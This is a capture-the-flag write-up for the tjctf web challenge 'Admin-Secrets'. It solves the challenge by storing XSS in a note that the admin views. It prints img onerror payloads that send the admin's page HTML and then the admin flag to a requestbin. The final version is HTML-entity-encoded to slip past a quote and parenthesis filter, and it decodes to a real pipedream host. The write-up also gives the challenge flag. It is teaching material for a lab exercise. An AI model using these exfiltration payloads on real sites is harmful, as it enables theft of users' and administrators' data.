# Admin-Secrets
Web, 100

>  Written by avz92
>  See if you can get the flag from the admin at this website!

We register and we see a note. By instinct, we enter `<img src=x onerror='alert(1)' />` and submit. And, we get an alert when viewing the note, and a "Report to admin" button. When viewing the source, we see there's an admin console which only the admin can view. Naturally, we exfiltrate the console:

```html
<img src=x onerror='fetch("your-requestbin", {method: "POST", body: document.head.outerHTML + document.body.outerHTML})' />
```

In our requestbin, we can see the following HTML:

```html
<button class="btn btn-primary flag-button">Access Flag</button>

<a href="/button" class="btn btn-primary other-button">Delete User</a>

<a href="/button" class="btn btn-primary other-button">Delete Post</a>
```

Along with this js:

```js
var flag='';
f=function(e){
    $.ajax({
        type: "GET",
        url: "/admin_flag",
        success: function(resp) {
            flag=resp;$("#responseAlert").text(resp); $("#responseAlert").css("display","");
        }
    })
    return flag;
};
$('.flag-button').on('click',f);
```

Strangely, sending a request to `/admin_flag` first seems to invalidate everything, so we first send a request to `your-requestbin` then `/admin_flag` then `your-requestbin` again (I replaced the "a"s in admin flag with `\x61` in case of any filter).

```html
<img src=x onerror='fetch("your-requestbin").then(r => $.ajax({type: "GET", url: "/\x61dmin_fl\x61g", success: v => fetch("your-requestbin", {method: "POST", body: v})}))' />
```

And, our requestbin gets a post request! We've solved it! Wait a second...

```
This post contains unsafe content. To prevent unauthorized access, the flag cannot be accessed for the following violations: Single quote found. Double quote found. Parenthesis found. 
```

So, we can't use quotes or parens, but that's fine, because we can just escape everything in HTML entity chars:

```html
<img src=x onerror=&#102;&#101;&#116;&#99;&#104;&#40;&#34;&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;&#101;&#110;&#50;&#104;&#108;&#107;&#114;&#110;&#115;&#51;&#117;&#121;&#111;&#46;&#120;&#46;&#112;&#105;&#112;&#101;&#100;&#114;&#101;&#97;&#109;&#46;&#110;&#101;&#116;&#47;&#98;&#97;&#105;&#116;&#34;&#41;&#46;&#116;&#104;&#101;&#110;&#40;&#114;&#32;&#61;&#62;&#32;&#36;&#46;&#97;&#106;&#97;&#120;&#40;&#123;&#116;&#121;&#112;&#101;&#58;&#32;&#34;&#71;&#69;&#84;&#34;&#44;&#32;&#117;&#114;&#108;&#58;&#32;&#34;&#47;&#97;&#100;&#109;&#105;&#110;&#95;&#102;&#108;&#97;&#103;&#34;&#44;&#32;&#115;&#117;&#99;&#99;&#101;&#115;&#115;&#58;&#32;&#118;&#32;&#61;&#62;&#32;&#102;&#101;&#116;&#99;&#104;&#40;&#34;&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;&#101;&#110;&#50;&#104;&#108;&#107;&#114;&#110;&#115;&#51;&#117;&#121;&#111;&#46;&#120;&#46;&#112;&#105;&#112;&#101;&#100;&#114;&#101;&#97;&#109;&#46;&#110;&#101;&#116;&#47;&#34;&#44;&#32;&#123;&#109;&#101;&#116;&#104;&#111;&#100;&#58;&#32;&#34;&#80;&#79;&#83;&#84;&#34;&#44;&#32;&#98;&#111;&#100;&#121;&#58;&#32;&#118;&#125;&#41;&#125;&#41;&#41; />
```

Flag: `tjctf{st0p_st3aling_th3_ADm1ns_fl4gs}`